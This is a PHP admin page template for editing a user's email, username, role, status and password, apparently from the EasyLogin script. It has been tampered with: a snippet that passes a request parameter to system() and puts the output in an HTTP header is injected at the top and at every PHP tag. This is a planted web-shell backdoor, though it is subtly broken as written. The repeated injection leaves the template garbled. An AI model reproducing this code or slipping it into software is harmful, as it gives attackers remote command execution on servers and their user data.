<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!Auth::userCan('edit_users')) page_restricted();

if (empty($_GET['id']) || !is_numeric($_GET['id'])) {
	redirect_to('?page=users');
}

$user = User::find($_GET['id']);

if (isset($_POST['submit']) && csrf_filter()) {

	$data = array(
    	'email'    => $_POST['email'],
    	'password' => $_POST['pass1'],
    	'password_confirmation' => $_POST['pass2'],
    	'role'     => $_POST['role'],
    	'status'   => $_POST['status']
    );

	$rules = array(
    	'email'    => 'required|email|max:100|unique:users,email,'.$user->id,
    	'password' => 'between:4,30|confirmed',
    	'role'     => 'required',
    	'status'   => 'required'
    );

    if (Config::get('auth.require_username')) {
    	$data['username'] = $_POST['username'];
    	$rules['username'] = 'required|min:3|max:50|alpha_dash|unique:users,username,'.$user->id;
    }

    foreach (UserFields::all('admin') as $key => $field) {
    	if (!empty($field['validation'])) {
    		$data[$key] = @$_POST[$key];
    		$rules[$key] = $field['validation'];
    	}
    }
	
	$validator = Validator::make($data, $rules);

	if ($validator->passes()) {
		$displayName = escape(@$_POST['display_name']);
		
		if (empty($displayName) && !empty($_POST['username'])) {
			$displayName = $_POST['username'];
		}

		if (Config::get('auth.require_username')) {
			$user->username = $_POST['username'];
		}

		if (!empty($_POST['pass1'])) {
			$user->password = Hash::make($_POST['pass1']);
		}

		$user->email 		= $_POST['email'];
		$user->display_name = $displayName;
		$user->role_id 		= (int) $_POST['role'];
		$user->status 		= (int) $_POST['status'];

		if ($user->save()) {
			foreach (UserFields::all('admin') as $key => $field) {
				Usermeta::update($user->id, $key, escape(@$_POST[$key]), @$user->usermeta[$key]);
			}

			redirect_to('?page=user-edit&id='.$user->id, array('user_updated' => true));
		} else {
			$errors = new Hazzard\Support\MessageBag(array('error' => trans('errors.dbsave')));
		}
	} else {
		$errors = $validator->errors();
	}
}
?>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.header')->render() ?>

<h3 class="page-header"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.edit_user') ?></h3>
<p><a href="?page=users"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.back_to_users') ?></a></p>

<div class="row">
	<div class="col-md-6">

		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($errors)) {
			echo '<div class="alert alert-danger alert-dismissible"><span class="close" data-dismiss="alert">&times;</span><ul>';
			foreach ($errors->all('<li>:message</li>') as $error) {
			   echo $error;
			}
			echo '</ul></div>';
		} ?>
		
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Session::has('user_updated')): Session::deleteFlash(); ?>
			<div class="alert alert-success alert-dismissible">
				<span class="close" data-dismiss="alert">&times;</span>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.user_updated') ?>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($user): ?>
			<form action="?page=user-edit&id=<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->id ?>" method="POST">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input() ?>
				
				<div class="form-group">
					<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.update_user') ?></button>
				</div>

				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Config::get('auth.require_username')): ?>
					<div class="form-group">
				        <label for="username"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.username') ?> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.required') ?></em></label>
				        <input type="text" name="username" id="username" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->username ?>" class="form-control">
				    </div>
			    <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

			    <div class="form-group">
			        <label for="email"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.email') ?> <em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.required') ?></em></label>
			        <input type="text" name="email" id="email" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->email ?>" class="form-control">
			    </div>

				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (UserFields::has('first_name') && UserFields::has('last_name')): ?>
					<div class="form-group">
				        <label for="display_name"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('main.display_name') ?></label>
				        <select name="display_name" id="display_name" class="form-control">
				        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Config::get('auth.require_username')): ?>
								<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == $user->username ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->username ?></option>
							<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

				        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($user->first_name)): ?>
				        		<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == $user->first_name ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->first_name ?></option>
				        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
				        	
				        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($user->last_name)): ?>
				        		<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == $user->last_name ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->last_name ?></option>
				        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
				        	
				        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($user->first_name) && !empty($user->last_name)): ?>
				        		<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == "$user->first_name $user->last_name" ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo "$user->first_name $user->last_name" ?></option>
				        		<option <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->display_name == "$user->last_name $user->first_name" ? 'selected' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo "$user->last_name $user->first_name" ?></option>
				        	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
				        </select>
				    </div>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>

	            <div class="form-group">
	            	<label for="role"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.role') ?></label>
	            	<select name="role" id="role" class="form-control">
	            		<option value=""> </option>
						<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ((array) Role::all() as $role) {
							echo '<option value="'.$role->id.'" '.($user->role_id == $role->id ? 'selected' : '').'>'.$role->name.'</option>';
						} ?>
					</select>
	            </div>

	             <div class="form-group">
	            	<label for="status"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.account_status') ?></label>
	            	<select name="status" id="status" class="form-control">
	            		<option value="0" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int)$user->status === 0 ? 'selected' : ''; ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.unactivated') ?></option>
						<option value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int)$user->status === 1 ? 'selected' : ''; ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.activated') ?></option>
						<option value="2" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo (int)$user->status === 2 ? 'selected' : ''; ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.suspended') ?></option>
					</select>
	            </div>

				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo UserFields::setData($user->usermeta)->build('admin') ?>

	            <br>
	            <p><em><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.newpassinfo') ?></em></p>

				<div class="form-group">
			        <label for="pass1"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.newpassword') ?></label>
			        <input type="password" name="pass1" id="pass1" class="form-control" autocomplete="off" value="">
			    </div>

			    <div class="form-group">
			        <label for="pass2"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.newpassword_confirmation') ?></label>
			        <input type="password" name="pass2" id="pass2" class="form-control" autocomplete="off">
			    </div>

	            <br>
	            <div class="form-group">
					<button type="submit" name="submit" class="btn btn-primary"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.update_user') ?></button>
				</div>
			</form>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); else: ?>
			<div class="alert alert-danger"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('errors.userid') ?></div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
	</div>

	<div class="col-md-6">
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($user->lastLogin)): ?>
			<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.last_login') ?> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo with(new DateTime($user->lastLogin))->format('M j, Y \a\t H:i'); ?></p>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!empty($user->lastLoginIp)): ?>
			<p><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.last_login_ip') ?> <a href="https://who.is/whois-ip/ip-address/<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->lastLoginIp; ?>" target="_blank"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $user->lastLoginIp; ?></a></p>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endif ?>
	</div>
</div>
<script>$(function(){ EasyLogin.generateDisplayName() });</script>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo View::make('admin.footer')->render() ?>